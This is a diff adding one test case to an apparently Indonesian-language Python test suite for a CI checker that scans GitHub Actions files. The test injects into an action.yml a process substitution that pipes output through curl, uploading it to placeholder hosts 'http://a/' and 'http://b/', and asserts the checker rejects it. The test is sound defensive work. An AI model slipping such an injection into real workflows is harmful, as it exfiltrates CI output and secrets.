@@ -42329,6 +42329,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("diff bundel menelan satu-satunya - sebagai nilai, tak menguras (Audit 2961)", rc == 0)
         shutil.rmtree(sub1998, ignore_errors=True)
+        sub1999 = klon(tmp, "sub1999")
+        berkas_aksi1999 = os.path.join(
+            sub1999, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1999, encoding="utf-8") as f:
+            isi_aksi1999 = f.read()
+        baris_aksi1999 = [b for b in isi_aksi1999.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1999 = isi_aksi1999.replace(
+                baris_aksi1999,
+                baris_aksi1999.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl -d x http://a/ --next -T - http://b/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1999 != isi_aksi1999, \
+            "suntikan aksi1999 tidak menembak"
+        with open(berkas_aksi1999, "w", encoding="utf-8") as f:
+            f.write(isi_baru1999)
+        rc, out = jalan(sub1999,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("konflik metode per seksi: data di seksi 1 tak membunuh unggahan stdin seksi 2 (Audit 2962)", rc != 0)
+        shutil.rmtree(sub1999, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
